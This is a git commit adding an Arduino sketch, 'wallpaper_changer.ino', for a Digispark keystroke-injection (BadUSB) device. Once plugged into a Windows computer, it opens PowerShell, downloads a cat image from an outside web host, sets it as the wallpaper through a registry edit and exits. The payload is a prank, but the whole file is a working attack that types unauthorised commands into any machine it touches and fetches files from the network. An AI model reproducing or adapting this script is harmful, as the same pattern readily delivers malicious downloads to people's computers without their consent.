c4a21e90ae5d74c18ecebcad946f002744ea1274
rielara <78863735+rielara@users.noreply.github.com>
2023-03-13 18:39:50 +0000

    Add files via upload

---
+++ wallpaper_changer.ino
@@ -0,0 +1,32 @@
+#include <DigiKeyboard.h>
+
+void setup (){}
+
+void loop ()
+{
+  int d=1000;
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(d);
+  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
+  DigiKeyboard.delay(600);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.delay(50);
+  DigiKeyboard.sendKeyStroke( KEY_ENTER);
+  DigiKeyboard.delay(d);
+  DigiKeyboard.print("$client = new-object System.Net.WebClient");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(d);
+  DigiKeyboard.print("$client.DownloadFile('https://images4.alphacoders.com/206/20658.jpg','kitty.jpg')");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(d);
+  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v WallPaper /d \"%USERPROFILE%\\kitty.jpg\" /f");
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(d);
+  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(d);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  for(;;){}
+}
